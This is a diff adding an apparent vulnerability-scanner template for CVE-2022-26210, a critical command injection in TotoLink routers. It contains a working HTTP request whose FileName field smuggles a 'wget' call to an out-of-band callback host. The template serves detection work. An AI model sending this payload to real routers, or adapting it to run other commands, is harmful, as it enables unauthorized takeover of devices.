@@ -1,0 +1,37 @@
+id: totolink-cstecgi-rce
+info:
+  name: TotoLink cstecgi.cgi File RCE (CVE-2022-26210)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    TotoLink routers contain a command injection vulnerability in the `setUpgradeFW` function, allowing remote command execution.
+  classification:
+    cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 9.8
+    cve-id: CVE-2022-26210
+  tags: command-execution,rce,router
+  reference:
+    - https://www.fortinet.com/blog/threat-research/totolink-vulnerabilities-beastmode-mirai-campaign
+
+http:
+  - raw:
+      - |
+        POST /cgi-bin/cstecgi.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {"topicurl":"setting/setUpgradeFW","FileName":";wget http://{{interactsh-url}};","Flags":"1","ContentLength":"1"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "upgradeERR1"
+        part: body
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "upgradeERR1"
